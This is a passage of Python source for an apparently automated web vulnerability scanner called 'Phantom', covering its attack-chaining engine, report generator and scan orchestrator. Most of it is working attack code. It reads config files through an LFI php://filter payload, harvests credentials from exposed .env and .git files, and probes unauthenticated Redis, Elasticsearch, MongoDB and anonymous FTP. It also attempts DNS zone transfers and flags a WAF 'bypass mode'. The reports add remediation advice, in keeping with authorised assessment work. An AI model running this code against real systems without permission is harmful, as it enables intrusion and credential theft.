    def __init__(self, vuln_engine: VulnEngine, crawler: WebCrawler,
                 state: ScanState, ui: UIManager):
        self.ve    = vuln_engine
        self.craw  = crawler
        self.state = state
        self.ui    = ui

    def decide_next_action(self, finding: Finding) -> None:
        """Core decision tree — trigger follow-up modules based on finding type."""
        ct = finding.chain_type
        if ct == "EXPOSED_ENV":
            self._handle_exposed_env(finding)
        elif ct == "EXPOSED_GIT":
            self._handle_exposed_git(finding)
        elif ct == "SQLI_CONFIRMED":
            self.ui.log("Chain: SQLi confirmed — extraction already done", "CHAIN")
        elif ct == "LFI_CONFIRMED":
            self._handle_lfi_confirmed(finding)
        elif ct == "SSTI_CONFIRMED":
            self.ui.log("Chain: SSTI confirmed — RCE vector flagged", "CHAIN")
        elif ct == "CLICKJACKING_CONFIRMED":
            self.ui.log("Chain: Clickjacking PoC generated", "CHAIN")
        elif "OPEN_REDIS" in ct:
            self.ui.log("Chain: Redis open — data access confirmed", "CHAIN")

    def _handle_exposed_env(self, finding: Finding) -> None:
        self.ui.log("Chain: .env exposed — scanning for secrets", "CHAIN")
        extracted = finding.extracted
        for k, v in extracted.items():
            if any(kw in k.upper() for kw in ["PASSWORD", "SECRET", "KEY", "TOKEN"]):
                self.ui.log(f"  Credential in .env: {k}={v[:20]}...", "VULN")
                self.state.add_finding(Finding(
                    vuln_id="", type="Credential Exposed",
                    severity="CRITICAL", location=finding.location,
                    evidence=f"{k}: {v[:30]}...",
                    cvss=9.9, owasp="A02:2021", cwe="CWE-312",
                    impact="Direct credential access to database/services",
                    fix=["Revoke and rotate credential immediately",
                         "Use vault/secrets manager", "Add .env to .gitignore"],
                ))

    def _handle_exposed_git(self, finding: Finding) -> None:
        self.ui.log("Chain: .git/config exposed — checking for credential in URL", "CHAIN")
        repo_url = finding.extracted.get("repo_url", "")
        if repo_url and "@" in repo_url:
            self.ui.log(f"  Git repo URL contains credentials: {repo_url[:50]}", "VULN")
            self.state.add_finding(Finding(
                vuln_id="", type="Git Credential Exposed",
                severity="CRITICAL", location=finding.location,
                evidence=f"Git remote URL with embedded credentials: {repo_url[:60]}",
                cvss=9.8, owasp="A02:2021", cwe="CWE-312",
                impact="Source code access + credential theft",
                fix=["git remote set-url to remove credentials",
                     "Use SSH keys or token-based auth for git remotes"],
            ))

    def _handle_lfi_confirmed(self, finding: Finding) -> None:
        self.ui.log("Chain: LFI confirmed — checking PHP filter wrappers", "CHAIN")
        # Attempt to read config files via php://filter (detection only)
        target_url = finding.location
        param      = finding.parameter
        parsed     = urlparse(target_url)
        params     = dict(parse_qsl(parsed.query))
        for cfg_file in ["config.php", "wp-config.php", "settings.php", ".env"]:
            payload = f"php://filter/convert.base64-encode/resource={cfg_file}"
            tp = params.copy(); tp[param] = payload
            resp = self.ve._req(target_url, params=tp)
            if resp and len(resp.text) > 20:
                try:
                    decoded = base64.b64decode(
                        re.search(r"[A-Za-z0-9+/=]{20,}", resp.text).group(0)
                    ).decode("utf-8", errors="ignore")
                    if any(kw in decoded.lower() for kw in
                           ["password", "secret", "define(", "DB_"]):
                        self.ui.log(f"  LFI→php://filter read {cfg_file}!", "VULN")
                        self.state.add_finding(Finding(
                            vuln_id="", type="LFI Config Read",
                            severity="CRITICAL", location=target_url,
                            parameter=param, payload=payload,
                            evidence=f"php://filter read {cfg_file} — config exposed",
                            extracted={"content_preview": decoded[:200]},
                            cvss=9.0, owasp="A01:2021", cwe="CWE-22",
                            impact="Config file source code exposed including credentials",
                            fix=["Disable php://filter", "Fix LFI vulnerability first"],
                        ))
                except Exception:
                    pass

    def run_service_chains(self, state: ScanState) -> None:
        """Run chain attacks on open services discovered in port scan."""
        host = urlparse(state.base_url).hostname
        port_nums = [p["port"] for p in state.open_ports]

        if 6379 in port_nums:
            self._chain_redis(host, state)
        if 9200 in port_nums or 9201 in port_nums:
            self._chain_elasticsearch(host, state)
        if 27017 in port_nums:
            self._chain_mongodb(host, state)
        if 21 in port_nums:
            self._chain_ftp(host, state)

    def _chain_redis(self, host: str, state: ScanState) -> None:
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, 6379))
            s.send(b"INFO server\r\n")
            data = s.recv(2048).decode("utf-8", errors="ignore"); s.close()
            if "redis_version" in data:
                ver = (re.search(r"redis_version:(.+)", data) or type("", (), {"group": lambda *_: "?"})()).group(1) if re.search(r"redis_version:(.+)", data) else "?"
                self.ui.log(f"Redis unauth access — v{str(ver).strip()}", "VULN")
                state.add_finding(Finding(
                    vuln_id="", type="Unauthenticated Redis",
                    severity="CRITICAL", location=f"redis://{host}:6379",
                    evidence=f"Redis INFO accessible — version {str(ver).strip()}",
                    cvss=9.8, owasp="A05:2021", cwe="CWE-306",
                    impact="Full read/write access to all cached data. "
                           "Can be used for SSRF pivot or data poisoning.",
                    fix=["Set Redis requirepass in redis.conf",
                         "Bind Redis to 127.0.0.1 only",
                         "Use network-level firewall rule"],
                    chain_type="OPEN_REDIS",
                ))
        except Exception:
            pass

    def _chain_elasticsearch(self, host: str, state: ScanState) -> None:
        for port in [9200, 9201]:
            try:
                r = requests.get(f"http://{host}:{port}/_cat/indices?v",
                                 timeout=5, verify=False)
                if r.status_code == 200 and ("green" in r.text or "yellow" in r.text):
                    self.ui.log(f"Elasticsearch open — indices listed on port {port}", "VULN")
                    indices = re.findall(r"\b\w{3,40}\b", r.text)[:10]
                    state.add_finding(Finding(
                        vuln_id="", type="Unauthenticated Elasticsearch",
                        severity="HIGH", location=f"http://{host}:{port}",
                        evidence=f"Indices accessible: {', '.join(set(indices))[:80]}",
                        cvss=7.5, owasp="A05:2021", cwe="CWE-306",
                        impact="All Elasticsearch indices accessible — data breach risk",
                        fix=["Enable Elasticsearch security (xpack.security.enabled: true)",
                             "Set username/password for all cluster access",
                             "Block port 9200 at firewall"],
                    ))
                    return
            except Exception:
                pass

    def _chain_mongodb(self, host: str, state: ScanState) -> None:
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, 27017))
            # isMaster wire protocol probe
            probe = (b"\x41\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
                     b"\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00"
                     b"\x00\x00\x00\x00\x01\x00\x00\x00"
                     b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00")
            s.send(probe)
            data = s.recv(512); s.close()
            if len(data) > 20:
                self.ui.log(f"MongoDB responding without auth on port 27017", "VULN")
                state.add_finding(Finding(
                    vuln_id="", type="Unauthenticated MongoDB",
                    severity="HIGH", location=f"mongodb://{host}:27017",
                    evidence="MongoDB wire protocol response without credentials",
                    cvss=7.5, owasp="A05:2021", cwe="CWE-306",
                    impact="Database collections accessible without authentication",
                    fix=["Enable MongoDB authentication (--auth flag)",
                         "Set security.authorization: enabled in mongod.conf",
                         "Bind to 127.0.0.1 and use firewall rules"],
                ))
        except Exception:
            pass

    def _chain_ftp(self, host: str, state: ScanState) -> None:
        try:
            s = socket.socket(); s.settimeout(4); s.connect((host, 21))
            banner = s.recv(256).decode("utf-8", errors="ignore")
            s.send(b"USER anonymous\r\n"); time.sleep(0.4); s.recv(256)
            s.send(b"PASS anon@phantom.test\r\n"); time.sleep(0.4)
            resp = s.recv(256).decode("utf-8", errors="ignore"); s.close()
            if "230" in resp:
                self.ui.log("FTP anonymous login SUCCESS!", "VULN")
                state.add_finding(Finding(
                    vuln_id="", type="FTP Anonymous Login",
                    severity="HIGH", location=f"ftp://{host}:21",
                    evidence=f"Anonymous FTP login accepted. Banner: {banner[:60]}",
                    cvss=7.5, owasp="A07:2021", cwe="CWE-287",
                    impact="Unauthenticated file download/upload. "
                           "May expose source code, backups, or config files.",
                    fix=["Disable anonymous FTP access",
                         "If FTP needed, enforce strong authentication",
                         "Consider SFTP/SCP instead of FTP"],
                ))
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

class ReportGenerator:
    """Generates Rich terminal report and JSON output file."""

    def __init__(self, state: ScanState, ui: UIManager):
        self.state = state
        self.ui    = ui
        self.console = Console()

    def _risk_score(self) -> int:
        c = self.state.counts()
        score = min(100, c["CRITICAL"] * 25 + c["HIGH"] * 12 + c["MEDIUM"] * 5 + c["LOW"] * 2)
        return score

    def _risk_label(self, score: int) -> str:
        if score >= 70: return "[bold red]CRITICAL[/bold red]"
        if score >= 50: return "[bold yellow]HIGH[/bold yellow]"
        if score >= 25: return "[bold cyan]MEDIUM[/bold cyan]"
        return "[bold green]LOW[/bold green]"

    def generate_terminal_report(self) -> None:
        """Print the full security report to terminal using Rich."""
        duration = time.time() - self.state.start_time
        mins     = int(duration // 60)
        secs     = int(duration % 60)
        counts   = self.state.counts()
        score    = self._risk_score()

        self.console.print()
        self.console.print(Rule("[bold red]◈  PHANTOM SECURITY ASSESSMENT REPORT  ◈[/bold red]"))
        self.console.print()

        # Executive summary
        summary = Table(title="[bold]Executive Summary[/bold]",
                        box=box.DOUBLE_EDGE, border_style="cyan",
                        show_header=True, header_style="bold cyan")
        summary.add_column("Metric", style="cyan", width=20)
        summary.add_column("Value",  style="white", ratio=1)
        summary.add_row("Target",       self.state.target)
        summary.add_row("Scan Time",    f"{mins}m {secs}s")
        summary.add_row("URLs Tested",  str(len(self.state.discovered_urls)))
        summary.add_row("Ports Scanned",str(len(TOP_1000_PORTS)))
        summary.add_row("Open Ports",   str(len(self.state.open_ports)))
        summary.add_row("Forms Found",  str(len(self.state.forms)))
        summary.add_row("JS Files",     str(len(self.state.js_files)))
        summary.add_row("Secrets Found",str(len(self.state.secrets)))
        summary.add_row("Total Issues", str(sum(counts.values())))
        summary.add_row("[bold red]CRITICAL[/bold red]",   str(counts["CRITICAL"]))
        summary.add_row("[bold yellow]HIGH[/bold yellow]",  str(counts["HIGH"]))
        summary.add_row("[bold cyan]MEDIUM[/bold cyan]",    str(counts["MEDIUM"]))
        summary.add_row("[bold green]LOW[/bold green]",     str(counts["LOW"]))
        summary.add_row("Risk Score",   f"{score}/100 — {self._risk_label(score)}")
        self.console.print(summary)
        self.console.print()

        # Open ports table
        if self.state.open_ports:
            ports_t = Table(title="[bold]Open Ports[/bold]",
                            box=box.SIMPLE_HEAVY, border_style="blue")
            ports_t.add_column("Port",    style="cyan",   width=8)
            ports_t.add_column("Service", style="white",  width=15)
            ports_t.add_column("Version", style="yellow", ratio=1)
            ports_t.add_column("CVEs",    style="red",    ratio=2)
            for p in self.state.open_ports:
                cve_str = "; ".join(p.get("cves", []))[:60] if p.get("cves") else "—"
                ports_t.add_row(str(p["port"]), p.get("service","?"),
                                p.get("version","")[:40] or "—",
                                cve_str)
            self.console.print(ports_t)
            self.console.print()

        # Findings table
        if self.state.findings:
            find_t = Table(title="[bold]Findings[/bold]",
                           box=box.SIMPLE_HEAVY, border_style="red",
                           show_lines=True)
            find_t.add_column("#",        style="dim",        width=8)
            find_t.add_column("Severity", style="bold",       width=10)
            find_t.add_column("Type",     style="white",      ratio=2)
            find_t.add_column("Location", style="cyan",       ratio=3)
            find_t.add_column("CVSS",     style="yellow",     width=6)

            sev_colors = UIManager.SEV_COLORS
            for f in sorted(self.state.findings,
                            key=lambda x: ["CRITICAL","HIGH","MEDIUM","LOW","INFO"].index(
                                x.severity if x.severity in
                                ["CRITICAL","HIGH","MEDIUM","LOW","INFO"] else "INFO")):
                clr = sev_colors.get(f.severity, "white")
                find_t.add_row(
                    f.vuln_id, f"[{clr}]{f.severity}[/{clr}]",
                    f.type, f.location[:60], str(f.cvss),
                )
            self.console.print(find_t)
            self.console.print()

        # Detail panels for critical/high
        for f in self.state.findings:
            if f.severity not in ("CRITICAL", "HIGH"):
                continue
            clr = UIManager.SEV_COLORS.get(f.severity, "white")
            content = Text()
            content.append(f"ID        : {f.vuln_id}\n", style="dim")
            content.append(f"Type      : {f.type}\n",    style="bold white")
            content.append(f"Location  : {f.location}\n",style="cyan")
            if f.parameter:
                content.append(f"Parameter : {f.parameter}\n", style="yellow")
            if f.payload:
                content.append(f"Payload   : ", style="dim")
                content.append(f"{f.payload[:80]}\n", style="bold red")
            if f.evidence:
                content.append(f"Evidence  : {f.evidence[:120]}\n", style="white")
            if f.extracted:
                content.append(f"Extracted : {json.dumps(f.extracted)[:100]}\n", style="green")
            content.append(f"\nCVSS      : {f.cvss}  |  {f.owasp}  |  {f.cwe}\n", style="dim")
            content.append(f"\nBUSINESS IMPACT:\n{f.impact}\n", style="bold yellow")
            if f.fix:
                content.append("\nREMEDIATION:\n", style="bold green")
                for i, step in enumerate(f.fix, 1):
                    content.append(f"  {i}. {step}\n", style="green")
            self.console.print(Panel(
                content,
                title=f"[{clr}][{f.severity}] {f.type}[/{clr}]",
                border_style=f.severity.lower().replace("critical", "red")
                              .replace("high", "yellow")
                              .replace("medium", "cyan").replace("low", "green"),
            ))

    def generate_json_report(self) -> str:
        """Save machine-readable JSON report and return the file path."""
        duration = time.time() - self.state.start_time
        counts   = self.state.counts()
        target_safe = re.sub(r"[^\w]", "_", self.state.target)[:30]
        fname    = f"phantom_report_{target_safe}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        report = {
            "scan_metadata": {
                "target":          self.state.target,
                "timestamp":       datetime.now().isoformat(),
                "duration_seconds": round(duration, 1),
                "scanner_version":  SCANNER_VERSION,
                "waf_detected":    self.state.waf_detected,
            },
            "summary": {
                "total_issues": sum(counts.values()),
                "critical":     counts["CRITICAL"],
                "high":         counts["HIGH"],
                "medium":       counts["MEDIUM"],
                "low":          counts["LOW"],
                "risk_score":   self._risk_score(),
                "urls_tested":  len(self.state.discovered_urls),
                "ports_scanned":len(TOP_1000_PORTS),
            },
            "open_ports": self.state.open_ports,
            "discovered_urls": list(self.state.discovered_urls)[:100],
            "extracted_secrets": self.state.secrets,
            "vulnerabilities": [
                {
                    "id":           f.vuln_id,
                    "type":         f.type,
                    "severity":     f.severity,
                    "cvss_score":   f.cvss,
                    "owasp":        f.owasp,
                    "cwe":          f.cwe,
                    "location":     f.location,
                    "parameter":    f.parameter,
                    "payload":      f.payload,
                    "evidence":     f.evidence,
                    "extracted_data": f.extracted,
                    "business_impact": f.impact,
                    "remediation":  f.fix,
                }
                for f in self.state.findings
            ],
        }

        with open(fname, "w") as fp:
            json.dump(report, fp, indent=2, default=str)
        return fname


# ══════════════════════════════════════════════════════════════════════════════
#  PHANTOM SCANNER (Main Orchestrator)
# ══════════════════════════════════════════════════════════════════════════════

class PhantomScanner:
    """Top-level orchestrator — coordinates all phases and chain engine."""

    def __init__(self, target: str):
        self.target = target.rstrip("/")
        parsed      = urlparse(target)
        if not parsed.scheme:
            self.target = "https://" + target
            parsed      = urlparse(self.target)
        self.host   = parsed.hostname or target
        self.ui     = UIManager()
        self.state  = ScanState(target=self.target, base_url=self.target)
        self.ui.set_state(self.state)

    def _phase0_recon(self) -> None:
        """DNS, WHOIS, WAF fingerprint."""
        self.ui.set_phase("Phase 0: Recon", 6)
        self.ui.log("Starting DNS & OSINT recon...", "INFO")

        # IP resolution
        try:
            ip = socket.gethostbyname(self.host)
            self.ui.log(f"IP: {ip}", "OK")
        except Exception:
            self.ui.log("Could not resolve hostname", "WARN")
        self.ui.advance_phase("Phase 0: Recon")

        # DNS records
        if DNS_AVAILABLE:
            for rtype in ["A", "MX", "NS", "TXT", "CNAME"]:
                try:
                    answers = dns.resolver.resolve(self.host, rtype)
                    for rdata in answers:
                        self.ui.log(f"DNS {rtype}: {rdata}", "OK")
                except Exception:
                    pass
            # Zone transfer attempt
            try:
                ns_records = dns.resolver.resolve(self.host, "NS")
                for ns in ns_records:
                    z = dns.zone.from_xfr(dns.query.xfr(str(ns), self.host))
                    if z:
                        self.ui.log(f"ZONE TRANSFER SUCCESS from {ns}!", "VULN")
                        self.state.add_finding(Finding(
                            vuln_id="", type="DNS Zone Transfer",
                            severity="HIGH", location=str(ns),
                            evidence="AXFR returned zone data",
                            cvss=7.5, owasp="A05:2021", cwe="CWE-200",
                            impact="Full subdomain enumeration for attacker",
                            fix=["Restrict zone transfers to authorised slave servers only"],
                        ))
            except Exception:
                pass
        self.ui.advance_phase("Phase 0: Recon")

        # WHOIS
        if WHOIS_AVAILABLE:
            try:
                w = whois_lib.whois(self.host)
                self.ui.log(f"Registrar: {w.registrar}", "OK")
            except Exception:
                pass
        self.ui.advance_phase("Phase 0: Recon")

        # WAF detection
        test_resp = None
        try:
            test_resp = requests.get(
                self.target + "/?q=<script>alert(1)</script>",
                headers={"User-Agent": USER_AGENTS[0]},
                timeout=10, verify=False
            )
        except Exception:
            pass
        if test_resp:
            h_str = str(test_resp.headers).lower()
            waf   = None
            if "cloudflare" in h_str:          waf = "Cloudflare"
            elif "x-sucuri-id" in h_str:       waf = "Sucuri WAF"
            elif "x-fw-hash" in h_str:         waf = "Unknown FW"
            elif "incapsula" in h_str:         waf = "Incapsula"
            elif "x-amzn-requestid" in h_str:  waf = "AWS WAF"
            elif test_resp.status_code in (403, 406, 429): waf = "Unknown WAF"
            if waf:
                self.state.waf_detected = waf
                self.ui.log(f"WAF detected: {waf} — enabling bypass mode", "WARN")
            else:
                self.ui.log("No WAF detected", "OK")
        self.ui.advance_phase("Phase 0: Recon")

    def _phase1_ports(self) -> None:
        scanner = PortScanner(self.host, self.ui)
        scanner.run(self.state)

    def _phase2_spider(self) -> None:
        crawler = WebCrawler(self.base_url, self.ui)
        crawler.run(self.state)
        self._crawler_ref = crawler

    def _phase3_vulns(self) -> None:
        """Run all 12 vulnerability modules across all discovered URLs."""
        ve = VulnEngine(self.base_url, self.ui, self.state)
        ce = ChainEngine(ve, getattr(self, "_crawler_ref", None), self.state, self.ui)

        all_urls = list(self.state.discovered_urls) or [self.base_url]
        total    = len(all_urls) * 7 + 6  # rough task estimate
        self.ui.set_phase("Phase 3: Vulns", total)

        # Scan each URL for injection, LFI, SSRF, IDOR, redirect
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            def scan_url(url: str) -> None:
                ve.test_sqli(url)
                ve.test_xss(url)
                ve.test_lfi(url)
                ve.test_ssrf(url)
                ve.test_cmdi(url)
                ve.test_idor(url)
                ve.test_open_redirect(url)
                ve.scan_response_for_secrets(url)
                self.ui.advance_phase("Phase 3: Vulns", 7)

            futures = [ex.submit(scan_url, url) for url in all_urls]
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception:
                    pass

        # Form-based testing
        ve.test_sqli_forms()
        ve.test_xss_forms()
        self.ui.advance_phase("Phase 3: Vulns", 1)

        # Site-wide checks (run once)
        ve.test_cors()
        self.ui.advance_phase("Phase 3: Vulns", 1)
        ve.test_headers()
        self.ui.advance_phase("Phase 3: Vulns", 1)
        ve.test_session_cookies()
        self.ui.advance_phase("Phase 3: Vulns", 1)
        ve.test_sensitive_files()
        self.ui.advance_phase("Phase 3: Vulns", 1)
        ve.test_clickjacking()
     
